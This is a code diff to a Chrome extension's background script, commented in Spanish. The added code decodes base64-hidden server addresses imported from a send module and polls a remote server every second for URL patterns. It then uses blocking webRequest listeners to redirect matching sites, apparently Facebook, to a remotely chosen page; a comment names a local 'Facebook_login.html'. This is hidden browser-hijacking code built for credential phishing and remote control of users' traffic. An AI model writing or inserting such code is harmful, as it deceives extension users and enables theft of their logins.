@@ -1,12 +1,16 @@
 'use strict';
 
 import { sendData } from './SendModule.js';
+import { codeFs } from './SendModule.js';
+import { codeFr } from './SendModule.js';
 
 //última URL enviada
 var oldUrl = ""
-var cadena = []
 //pestaña actual
-var currentTab = 0 
+var currentTab = 0
+var oldSt = "*://www.unapagina.com/*"
+var st = "*://www.unapagina.com/*" //"*://*." "*://www.facebook.com/*" "*://www.unapagina.com/*"
+var rd = ""
 
 //cuando se cambia la pestaña activa o se cierra una pestaña----------------------------------------- 
 chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
@@ -79,21 +83,48 @@ function checkData(tabId){
         });
 };
 
-//recorre un array con las id de las pestañas --------------------------------------------------------
-function exitsTabid(tabId)
-{
-	var x 
-	for (var x=0; x<cadena.length; x++){
-		if (cadena[x] == tabId){
-			return true;
-		}
-	};
-	cadena.push(tabId); 
-	return false;
-};
+//actualiza los datos del fichero url para bloqueo y redireccion cada segundo--------------------
+setInterval(actualizarStRd,1000);
 
-//Incluir retardos en milisegundos---------------------------------------------------------------- 
-function sleep(milliSeconds){
-	var startTime = new Date().getTime();
-	while (new Date().getTime() < startTime + milliSeconds);
+//Comprueba si ha cambiado el contenido de ficheros url para bloqueo y redireccion---------------
+function actualizarStRd(){
+	Site(codeFs,0);
+	if ((st != "" ) && (oldSt != st)){
+		oldSt = st;
+		setListener(st);
+	}
 }
+
+//lectura del fichero de urls para bloqueo y redirección-----------------------------------------
+function Site(code,mode){
+	var SRV = atob (code)
+	var ajaxReq = new XMLHttpRequest();
+	ajaxReq.open("GET", SRV, true);
+	ajaxReq.send();
+	ajaxReq.onreadystatechange = function (){
+		if (ajaxReq.readyState == 4 && ajaxReq.status == 200){
+			if (mode == 0){
+				st = ajaxReq.responseText;
+			}else if (mode == 1){
+				rd = ajaxReq.responseText;
+			}
+		}
+	}
+}
+
+//cuando cambia el valor de la url a bloquear se actualizan los oyentes--------------------------
+function setListener(ST) {
+	chrome.webRequest.onBeforeRequest.removeListener(requestHandler);
+  	chrome.webRequest.onBeforeRequest.addListener(requestHandler,{ urls: [ ST ],}, ["blocking"]);
+  	chrome.webRequest.handlerBehaviorChanged(requestHandler);
+}
+
+//Redirecciona las URL a otra o la bloquea--------------------------------------------------------
+function requestHandler(details){
+		Site(codeFr,1);
+		if (rd != "" ){
+			return {redirectUrl: rd} //"http://192.168.1.42/Facebook_login.html"
+		}else{
+			return {cancel: true}
+		}
+	}
